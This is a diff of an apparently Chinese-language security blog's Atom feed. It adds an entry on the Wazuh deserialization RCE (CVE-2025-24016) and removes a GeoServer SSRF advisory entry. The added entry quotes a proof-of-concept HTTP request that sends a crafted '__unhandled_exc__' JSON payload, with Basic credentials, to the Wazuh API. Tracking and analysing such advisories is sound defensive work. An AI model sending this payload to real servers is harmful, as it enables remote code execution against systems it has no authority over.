@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-10T21:00:29.719Z</updated>
+  <updated>2025-06-10T21:45:19.850Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Wazuh 反序列化远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/10/github_2878933385/"/>
+    <id>http://example.com/2025/06/10/github_2878933385/</id>
+    <published>2025-06-10T21:45:19.849Z</published>
+    <updated>2025-06-10T21:45:19.850Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wazuh 反序列化远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24016</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Wazuh是一个免费开源的威胁预防、检测和响应平台。从版本4.4.0开始到4.9.1之前，存在一个不安全的反序列化漏洞，允许在Wazuh服务器上执行远程代码。DistributedAPI参数被序列化为JSON并使用<code>as_wazuh_object</code>（位于<code>framework/wazuh/core/cluster/common.py</code>中）进行反序列化。如果攻击者能够在DAPI请求&#x2F;响应中注入未经过滤的字典，他们可以伪造一个未处理的异常（<code>__unhandled_exc__</code>）来评估任意Python代码。任何具有API访问权限的人（被入侵的仪表板或集群中的Wazuh服务器）或在某些配置下甚至是被入侵的代理都可以触发此漏洞。版本4.9.1包含修复。</p><p><strong>产品厂商：</strong> Wazuh</p><p><strong>产品名称：</strong> Wazuh</p><p><strong>影响版本：</strong> 4.4.0 &lt;&#x3D; version &lt; 4.9.1</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-24016">https://github.com/B1ack4sh/Blackash-CVE-2025-24016</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24016-Wazuh-Remote-Code-Execution-RCE-PoC-🚨"><a href="#CVE-2025-24016-Wazuh-Remote-Code-Execution-RCE-PoC-🚨" class="headerlink" title="CVE-2025-24016 Wazuh Remote Code Execution (RCE) - PoC 🚨"></a>CVE-2025-24016 Wazuh Remote Code Execution (RCE) - PoC 🚨</h2><h2 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h2><p>Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using <code>as_wazuh_object</code> (in <code>framework/wazuh/core/cluster/common.py</code>). If an attacker manages to inject an unsanitized dictionary in DAPI request&#x2F;response, they can forge an unhandled exception (<code>__unhandled_exc__</code>) to evaluate arbitrary python code. The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh servers in the cluster) or, in certain configurations, even by a compromised agent. Version 4.9.1 contains a fix.</p><h2 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics:"></a>Metrics:</h2><p>CNA:  <code>GitHub</code>, Inc. Base Score: 9.9 CRITICAL Vector:  CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:N&#x2F;S:C&#x2F;C:L&#x2F;I:H&#x2F;A:H</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept:"></a>Proof of Concept:</h2><p>To trigger this vulnerability using the server API, follow the steps below.</p><h2 id="PoC-Burp-Suite-Request"><a href="#PoC-Burp-Suite-Request" class="headerlink" title="PoC Burp Suite Request:"></a>PoC Burp Suite Request:</h2><ol><li>Burp Suite Request to Trigger the Vulnerability:</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/security/user/authenticate/run_as</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com:55000<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic d2F6dXcta3dpTUltUzNjcjM3UDA1MHItOg==  # Base64-encoded &quot;wazuh-wui:MyS3cr37P450r.*-&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;__unhandled_exc__&quot;</span>: &#123;</span><br><span class="language-prolog">    <span class="hljs-string">&quot;__class__&quot;</span>: <span class="hljs-string">&quot;exit&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;__args__&quot;</span>: []</span><br><span class="language-prolog">  &#125;</span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>Explanation of Request:</li></ol><ul><li>Authorization Header: This is the base64-encoded authorization (<code>wazuh-wui:MyS3cr37P450r.*-</code>).</li><li>Payload: The malicious payload contains the unsanitized exception <code>__unhandled_exc__</code> which triggers the execution of arbitrary Python code (<code>exit</code> in this case).</li></ul><h2 id="Disclaimer-⚠️"><a href="#Disclaimer-⚠️" class="headerlink" title="Disclaimer ⚠️"></a>Disclaimer ⚠️</h2><p>For educational and research purposes only. Use only against systems you own or have permission to test.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wazuh 反序列化远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
   
   <entry>
     <title>Wazuh Web Interface 版本检测漏洞</title>
@@ -493,30 +520,6 @@
       
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-jm79-7xhw-6f6f&quot;&gt;https://github.com/advisories/GHSA-jm79-7xhw-6f6f&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Coverage REST API Server Side Request Forgery</title>
-    <link href="http://example.com/2025/06/10/github_3689855047/"/>
-    <id>http://example.com/2025/06/10/github_3689855047/</id>
-    <published>2025-06-10T14:30:14.632Z</published>
-    <updated>2025-06-10T14:30:14.633Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-r4hf-r8gj-jgw2">https://github.com/advisories/GHSA-r4hf-r8gj-jgw2</a></p><p><strong>仓库 Star：</strong> 4052</p><p><strong>CVSS 评分：</strong> 5.5</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-r4hf-r8gj-jgw2">https://github.com/geoserver/geoserver/security/advisories/GHSA-r4hf-r8gj-jgw2</a></p></li><li><p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11468">https://osgeo-org.atlassian.net/browse/GEOS-11468</a></p></li><li><p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11717">https://osgeo-org.atlassian.net/browse/GEOS-11717</a></p></li><li><p><a href="https://github.com/advisories/GHSA-r4hf-r8gj-jgw2">https://github.com/advisories/GHSA-r4hf-r8gj-jgw2</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>The Coverage rest api <code>/workspaces/&#123;workspaceName&#125;/coveragestores/&#123;storeName&#125;/&#123;method&#125;.&#123;format&#125;</code> allow to upload file with a specified url (with {method} equals ‘url’) with no restrict.</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>The Coverage rest api <code>/workspaces/&#123;workspaceName&#125;/coveragestores/&#123;storeName&#125;/&#123;method&#125;.&#123;format&#125;</code> allow to upload file with a specified url (with {method} equals ‘url’). But this url has not been check with <a href="https://docs.geoserver.org/latest/en/user/security/urlchecks.html#url-checks">URL Checks feature</a>.</p><p>For example, should add the code below to check fileURL:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">URLCheckers.confirm(fileURL)<br></code></pre></td></tr></table></figure><p>The vulnerable code was <a href="https://github.com/geoserver/geoserver/blob/main/src/rest/src/main/java/org/geoserver/rest/util/RESTUtils.java#L176">RESTUtils.java</a></p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>This vulnerability presents the opportunity for Server Side Request Forgery.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11468">https://osgeo-org.atlassian.net/browse/GEOS-11468</a></li><li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11717">https://osgeo-org.atlassian.net/browse/GEOS-11717</a></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-r4hf-r8gj-jgw2&quot;&gt;https://github.com/advisories/GHSA-r4hf-r8gj-jgw2&lt;/a&gt;&lt;/p</summary>
       
     
     
